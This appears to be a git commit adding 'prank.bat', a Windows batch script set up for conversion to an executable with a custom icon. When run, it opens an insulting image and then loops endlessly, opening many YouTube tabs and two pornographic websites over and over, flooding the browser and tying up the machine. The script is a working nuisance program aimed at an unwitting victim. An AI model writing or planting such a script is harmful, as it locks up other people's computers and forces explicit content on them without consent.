08da0f0bf5652503decb67d708b3bb4de246b17e
meowinghuman <70555795+meowinghuman@users.noreply.github.com>
2020-09-23 00:13:09 -0400

    Add files via upload

---
+++ prank.bat
@@ -0,0 +1,41 @@
+@ECHO OFF
+REM BFCPEOPTIONSTART
+REM Advanced BAT to EXE Converter www.BatToExeConverter.com
+REM BFCPEEXE=
+REM BFCPEICON=C:\Users\thecl\Downloads\Oxygen-Icons.org-Oxygen-Mimetypes-application-x-ms-dos-executable.ico
+REM BFCPEICONINDEX=-1
+REM BFCPEEMBEDDISPLAY=0
+REM BFCPEEMBEDDELETE=1
+REM BFCPEADMINEXE=0
+REM BFCPEINVISEXE=0
+REM BFCPEVERINCLUDE=0
+REM BFCPEVERVERSION=1.0.0.0
+REM BFCPEVERPRODUCT=Product Name
+REM BFCPEVERDESC=Product Description
+REM BFCPEVERCOMPANY=Your Company
+REM BFCPEVERCOPYRIGHT=Copyright Info
+REM BFCPEOPTIONEND
+@ECHO ON
+@echo off
+start https://memegenerator.net/img/instances/64421279/fucked-you-are.jpg
+TIMEOUT 3
+:A
+start https://www.youtube.com/watch?v=48rz8udZBmQ
+start https://www.youtube.com/watch?v=y5DgFMleM04
+start https://www.youtube.com/watch?v=dgUbRpdUN1w
+:B
+start https://www.youtube.com/watch?v=nOPIu7isD3s
+start https://www.youtube.com/watch?v=nOPIu7isD3s
+start https://www.youtube.com/watch?v=nOPIu7isD3s
+start https://www.youtube.com/watch?v=nOPIu7isD3s
+start https://www.youtube.com/watch?v=nOPIu7isD3s
+start https://www.youtube.com/watch?v=nOPIu7isD3s
+start https://www.youtube.com/watch?v=nOPIu7isD3s
+start https://www.youtube.com/watch?v=nOPIu7isD3s
+:C
+start https://www.youtube.com/watch?v=tE7o7kFSyBI
+start https://www.youtube.com/watch?v=tE7o7kFSyBI
+start https://www.youtube.com/watch?v=tE7o7kFSyBI
+start www.pornhub.com
+start www.xvideos.com
+goto :A
